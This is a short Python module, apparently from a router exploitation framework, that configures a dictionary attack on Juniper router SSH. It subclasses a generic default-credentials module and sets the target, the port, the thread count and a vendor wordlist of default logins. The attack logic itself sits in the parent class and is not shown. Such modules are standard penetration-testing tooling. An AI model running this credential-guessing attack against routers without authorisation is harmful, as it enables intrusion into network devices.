from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    __info__ = {
        "name": "Juniper Router Default SSH Creds",
        "description": "Module performs dictionary attack against Juniper Router SSH service. "
                       "If valid credentials are foundm they are displayed to the user.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
        "devices": (
            "Juniper Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("file://wordlists/vendors/juniper_defaults.txt", "User:Pass or file with default credentials (file://)")
